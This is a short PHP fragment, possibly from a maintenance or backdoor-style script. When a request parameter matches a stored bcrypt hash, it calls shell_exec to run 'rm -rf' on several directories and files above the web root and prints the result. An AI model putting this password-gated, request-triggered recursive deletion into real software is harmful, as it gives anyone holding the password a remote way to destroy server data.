...
if (password_verify($_REQUEST['p'], '$2y$10$UOmZtkKs1X17vE/mmbfVgOiy0ZAkXnxa9UxFO97cFX8ioiJZpZ96S')) {
  ...
  echo "\n\n" . htmlspecialchars((string) shell_exec("(/bin/rm -rf ../README.md   ../.nfs00000000050c0a6700000001 ../public_html_20180723 ../.subversion ../logs ../.composer ../www ../core)  2>&1"), ENT_QUOTES);
